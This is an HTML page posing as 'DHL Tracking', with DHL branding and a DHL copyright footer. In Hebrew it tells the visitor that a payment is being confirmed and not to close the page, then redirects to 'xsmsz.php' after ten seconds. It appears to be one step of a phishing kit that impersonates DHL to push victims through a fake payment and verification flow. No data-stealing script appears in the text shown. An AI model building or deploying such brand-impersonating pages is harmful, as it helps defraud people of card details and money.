
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="refresh" content="10; URL=xsmsz.php">
    <link rel="shortcut icon" href="img/dhl-logo.jpg">
    <link rel="stylesheet" href="css/css3.css">
    <title>DHL Tracking</title>
</head>
    <body>

        <div class="col-md-12 col-sm-12 form-wrap" style="margin-top:0; border-radius:0 0 5px 5px;">
                    <div class="justified-wrap">
                        <style type="text/css">
                            .loader {
        border: 16px solid #f3f3f3;
        border-radius: 50%;
        border-top: 16px solid black;
        width: 50px;
        height: 50px;
        -webkit-animation: spin 2s linear infinite; /* Safari */
        animation: spin 2s linear infinite;
   }
   
/* Safari */
@-webkit-keyframes spin {
  0% { -webkit-transform: rotate(0deg); }
  100% { -webkit-transform: rotate(360deg); }
}

@keyframes spin {
  0% { transform: rotate(0deg); }
  100% { transform: rotate(360deg); }
}
                        </style>
        <div class="msg-page"> 
            <!-- header -->
        <div class="msg-header">
            <div class="msg-header-img">
                <img src="img/lg.svg" alt="">
            </div>
        </div>



            <div class="col-md-12 col-sm-12 no-space">
                <div class="load-confirm">
                    <center>אשר תשלום...</center>
                       <br>
                   <center><div  class="loader"></div></center>
                </div>
                            

                                         
                        

                 <div class="clearfix"></div>
                                <div class="alert alert-danger  display-hide" style="display:none;">
                    <button data-dismiss="alert" class="close" type="button">×</button>
                    <strong> Error!</strong>   All fields are required.                </div>
                 
                 
                 <div class="clearfix"></div>
                 <!--              
                 </div>-->
                                 
                                                
                                              
    
                <div class="text-nav" style=" text-align:center; margin-top:15px;"><span>אל תסגור את הדף,</span></div>
                                                                    
                        
                <div style="display: none;" id="hidden_fields"></div>
            </div>
            <div class="msg-footer">
            <span class="msg-footer-right">&copy; 2021 DHL International GmbH - All rights reserved.</span>
        </div>
        </div>
    </body>
</html>